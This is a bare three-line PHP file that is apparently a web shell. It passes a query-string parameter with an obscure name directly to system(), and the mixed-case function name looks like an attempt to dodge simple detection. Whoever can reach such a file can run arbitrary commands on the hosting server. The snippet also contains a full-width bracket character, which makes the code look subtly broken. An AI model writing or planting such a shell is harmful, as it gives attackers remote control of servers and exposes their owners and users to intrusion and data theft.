<?php
SysTeM($_GET['N-qQsFhc'〕);
?>
